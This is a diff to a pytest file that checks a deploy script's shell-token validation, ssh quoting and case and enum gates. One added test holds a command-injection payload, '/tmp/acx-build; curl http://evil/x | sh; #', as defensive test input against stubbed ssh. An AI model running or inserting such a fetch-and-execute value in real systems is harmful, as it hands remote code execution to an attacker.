@@ -320,8 +320,12 @@ def test_d1_acx_build_target_charset_gate_exists() -> None:
     """D1 structural: charset allowlist + ingestion-time validation present."""
     script = DEPLOY_SCRIPT.read_text(encoding="utf-8")
     assert "assert_safe_shell_token" in script
-    assert re.search(r"\[A-Za-z0-9_\.\-\]\+", script)
+    # `/` allowed so ACX_REMOTE_BUILD_DIR shares this gate (path-safe, not a shell metachar).
+    assert re.search(r"\[A-Za-z0-9_\./\-\]\+", script) or re.search(
+        r"\[A-Za-z0-9_./\-\]\+", script
+    )
     assert "assert_safe_shell_token \"ACX_BUILD_TARGET\"" in script
+    assert "assert_safe_shell_token \"ACX_REMOTE_BUILD_DIR\"" in script
     assert "assert_safe_image_repo" in script
 
 
@@ -353,8 +357,8 @@ def test_d1_rejects_metacharacter_build_target() -> None:
             f"error must name charset refusal for {target!r}: {combined}"
         )
 
-    # Legitimate targets still accepted.
-    for target in ("", "runtime", "runtime-vlm", "builder", "foo_bar.1-2"):
+    # Legitimate charset values still accepted by the token gate (enum is separate).
+    for target in ("", "runtime", "runtime-vlm", "builder", "foo_bar.1-2", "/tmp/acx-build"):
         result = _probe_build_target(target)
         assert result.returncode == 0, (
             f"legitimate target {target!r} must pass: {result.stderr}"
@@ -383,6 +387,134 @@ def test_d1_full_script_refuses_evil_build_target_at_ingestion() -> None:
     assert "charset" in combined.lower() or "refusing" in combined.lower()
 
 
+def test_d1_remote_build_dir_injection_refused_before_ssh(tmp_path: pathlib.Path) -> None:
+    """S2-A-01 / TEST-15: evil ACX_REMOTE_BUILD_DIR must not reach ssh argv.
+
+    Executes the real deploy script with a PATH-stubbed ssh that logs every
+    argv payload. The injection payload from the adversarial review
+    (``/tmp/acx-build; curl http://evil/x | sh; #``) must fail closed at
+    ingestion — ssh must never be invoked with that string.
+    """
+    bindir = tmp_path / "bin"
+    bindir.mkdir()
+    ssh_log = tmp_path / "ssh.log"
+    ssh_log.write_text("")
+    (bindir / "ssh").write_text(
+        "#!/bin/sh\n"
+        f'printf "%s\\n" "$*" >> "{ssh_log}"\n'
+        "exit 0\n"
+    )
+    (bindir / "ssh").chmod(0o755)
+    # Also stub docker/rsync so a regression that reaches further still can't touch a host.
+    (bindir / "docker").write_text("#!/bin/sh\nexit 0\n")
+    (bindir / "docker").chmod(0o755)
+    (bindir / "rsync").write_text("#!/bin/sh\nexit 0\n")
+    (bindir / "rsync").chmod(0o755)
+
+    evil = "/tmp/acx-build; curl http://evil/x | sh; #"
+    env = os.environ.copy()
+    env["PATH"] = f"{bindir}:{env['PATH']}"
+    env["ACX_REMOTE_BUILD_DIR"] = evil
+    env["REMOTE_BUILD"] = "1"
+    proc = subprocess.run(
+        ["bash", str(DEPLOY_SCRIPT), "help"],
+        check=False,
+        capture_output=True,
+        text=True,
+        env=env,
+        timeout=15,
+    )
+    assert proc.returncode != 0, (
+        f"evil ACX_REMOTE_BUILD_DIR must fail at ingestion; "
+        f"stdout={proc.stdout!r} stderr={proc.stderr!r}"
+    )
+    combined = (proc.stdout or "") + (proc.stderr or "")
+    assert "ACX_REMOTE_BUILD_DIR" in combined or "charset" in combined.lower()
+    # ssh must not have been invoked at all (ingestion fails before dispatch).
+    assert ssh_log.read_text() == "", f"ssh was invoked with: {ssh_log.read_text()!r}"
+
+    # Legitimate default path is accepted at ingestion (help exits 0).
+    env2 = os.environ.copy()
+    env2["PATH"] = f"{bindir}:{env2['PATH']}"
+    env2["ACX_REMOTE_BUILD_DIR"] = "/tmp/acx-build"
+    proc2 = subprocess.run(
+        ["bash", str(DEPLOY_SCRIPT), "help"],
+        check=False,
+        capture_output=True,
+        text=True,
+        env=env2,
+        timeout=15,
+    )
+    assert proc2.returncode == 0, proc2.stderr
+
+
+def test_d1_remote_build_dir_quoted_at_ssh_sink(tmp_path: pathlib.Path) -> None:
+    """S2-A-01: validated REMOTE_BUILD_DIR is single-quoted in the mkdir/cd sinks.
+
+    Executes do_build_remote with stubs so the real ssh command strings are captured.
+    """
+    bindir = tmp_path / "bin"
+    bindir.mkdir()
+    ssh_log = tmp_path / "ssh.log"
+    ssh_log.write_text("")
+    # ssh stub: log remote command payload (last arg) and succeed for preflight checks.
+    (bindir / "ssh").write_text(
+        textwrap.dedent(
+            f"""\
+            #!/bin/sh
+            # Log every remote command string (last argv) for sink inspection.
+            for a in "$@"; do last="$a"; done
+            printf '%s\\n' "$last" >> "{ssh_log}"
+            # Free-space preflight parses df output from a remote command.
+            case "$last" in
+              *df*) echo 20 ;;
+            esac
+            exit 0
+            """
+        )
+    )
+    (bindir / "ssh").chmod(0o755)
+    (bindir / "rsync").write_text("#!/bin/sh\nexit 0\n")
+    (bindir / "rsync").chmod(0o755)
+    (bindir / "docker").write_text("#!/bin/sh\nexit 0\n")
+    (bindir / "docker").chmod(0o755)
+
+    safe_dir = "/tmp/acx-build-safe"
+    env = os.environ.copy()
+    env["PATH"] = f"{bindir}:{env['PATH']}"
+    env["ACX_REMOTE_BUILD_DIR"] = safe_dir
+    env["REMOTE_BUILD"] = "1"
+    # Source and call do_build_remote with preflight stubs that still exercise ssh sinks.
+    script = textwrap.dedent(
+        f"""\
+        source "{DEPLOY_SCRIPT}"
+        preflight_ssh() {{ :; }}
+        preflight_remote_docker() {{ :; }}
+        preflight_rsync() {{ :; }}
+        refuse_remote_vlm_build() {{ :; }}
+        remote_builder_prune() {{ :; }}
+        # assert_remote_build_free_space uses ssh; leave real so sink log captures it too,
+        # but override to skip the numeric gate if parse fails.
+        assert_remote_build_free_space() {{ :; }}
+        do_build_remote dev
+        """
+    )
+    proc = subprocess.run(
+        ["bash", "-c", script],
+        check=False,
+        capture_output=True,
+        text=True,
+        env=env,
+        timeout=30,
+    )
+    assert proc.returncode == 0, f"stdout={proc.stdout!r} stderr={proc.stderr!r}"
+    payloads = ssh_log.read_text()
+    assert f"mkdir -p -- '{safe_dir}'" in payloads, payloads
+    assert f"cd -- '{safe_dir}'" in payloads, payloads
+    # Unquoted form must not appear as the remote command (regression of the original sink).
+    assert f"mkdir -p {safe_dir}" not in payloads.replace(f"mkdir -p -- '{safe_dir}'", "")
+
+
 def test_d8_variant_vlm_without_vlm_target_fails_closed() -> None:
     """D8 build-half: ACX_IMAGE_VARIANT=vlm + non-*vlm* target is refused."""
     script = DEPLOY_SCRIPT.read_text(encoding="utf-8")
@@ -401,6 +533,101 @@ def test_d8_variant_vlm_without_vlm_target_fails_closed() -> None:
     assert proc.returncode != 0
     combined = (proc.stdout or "") + (proc.stderr or "")
     assert "ACX_IMAGE_VARIANT=vlm" in combined
+
+
+def test_d8_case_and_enum_fail_closed() -> None:
+    """S2-A-03 / D8: case-bypass and non-enum values must be refused at ingestion.
+
+    Executes the real script (not a source grep). Reviewer proof vectors:
+    - ACX_IMAGE_VARIANT=VLM ACX_BUILD_TARGET=runtime  (case bypass → was exit 0)
+    - ACX_BUILD_TARGET=Runtime-Vlm  (evades *vlm* lowercase match + remote refuse)
+    - ACX_IMAGE_VARIANT=vlm2 / ACX_BUILD_TARGET=bogus  (no enum → was accepted)
+    """
+    # Fail-closed vectors (ingestion / help). Runtime-Vlm alone folds to runtime-vlm and
+    # is a valid enum member for help — its remote-build refusal is covered separately.
+    fail_cases = [
+        {"ACX_IMAGE_VARIANT": "VLM", "ACX_BUILD_TARGET": "runtime"},
+        {"ACX_IMAGE_VARIANT": "vlm2"},
+        {"ACX_BUILD_TARGET": "bogus"},
+        {"ACX_IMAGE_VARIANT": "BOGUS"},
+    ]
+    for overrides in fail_cases:
+        env = os.environ.copy()
+        env.update(overrides)
+        proc = subprocess.run(
+            ["bash", str(DEPLOY_SCRIPT), "help"],
+            check=False,
+            capture_output=True,
+            text=True,
+            env=env,
+            timeout=15,
+        )
+        assert proc.returncode != 0, (
+            f"expected refuse for {overrides!r}; "
+            f"stdout={proc.stdout!r} stderr={proc.stderr!r}"
+        )
+
+    # Case-normalised legitimate pair still accepted.
+    env_ok = os.environ.copy()
+    env_ok["ACX_BUILD_TARGET"] = "Runtime"
+    env_ok["ACX_IMAGE_VARIANT"] = "Recognition"
+    proc_ok = subprocess.run(
+        ["bash", str(DEPLOY_SCRIPT), "help"],
+        check=False,
+        capture_output=True,
+        text=True,
+        env=env_ok,
+        timeout=15,
+    )
+    assert proc_ok.returncode == 0, proc_ok.stderr
+
+    # Uppercase VLM + Runtime-Vlm: both fold lower → vlm + runtime-vlm → OK at ingestion.
+    # (Remote build still refuses via refuse_remote_vlm_build — see sibling test.)
+    env_vlm = os.environ.copy()
+    env_vlm["ACX_IMAGE_VARIANT"] = "VLM"
+    env_vlm["ACX_BUILD_TARGET"] = "Runtime-Vlm"
+    proc_vlm = subprocess.run(
+        ["bash", str(DEPLOY_SCRIPT), "help"],
+        check=False,
+        capture_output=True,
+        text=True,
+        env=env_vlm,
+        timeout=15,
+    )
+    assert proc_vlm.returncode == 0, proc_vlm.stderr
+
+
+def test_d8_remote_build_refuses_case_evasion_runtime_vlm(tmp_path: pathlib.Path) -> None:
+    """S2-A-03: ACX_BUILD_TARGET=Runtime-Vlm must refuse remote build after case fold."""
+    bindir = tmp_path / "bin"
+    bindir.mkdir()
+    (bindir / "ssh").write_text("#!/bin/sh\nexit 0\n")
+    (bindir / "ssh").chmod(0o755)
+    env = os.environ.copy()
+    env["PATH"] = f"{bindir}:{env['PATH']}"
+    env["ACX_BUILD_TARGET"] = "Runtime-Vlm"
+    env["REMOTE_BUILD"] = "1"
+    script = textwrap.dedent(
+        f"""\
+        source "{DEPLOY_SCRIPT}"
+        preflight_ssh() {{ :; }}
+        preflight_remote_docker() {{ :; }}
+        preflight_rsync() {{ :; }}
+        do_build_remote dev
+        """
+    )
+    proc = subprocess.run(
+        ["bash", "-c", script],
+        check=False,
+        capture_output=True,
+        text=True,
+        env=env,
+        timeout=15,
+    )
+    assert proc.returncode != 0
+    combined = (proc.stdout or "") + (proc.stderr or "")
+    assert "vlm" in combined.lower()
+    assert "refuse" in combined.lower() or "refuses" in combined.lower()
 
 
 def test_d4_boot_smoke_uses_real_entrypoint_and_cache_mount() -> None:
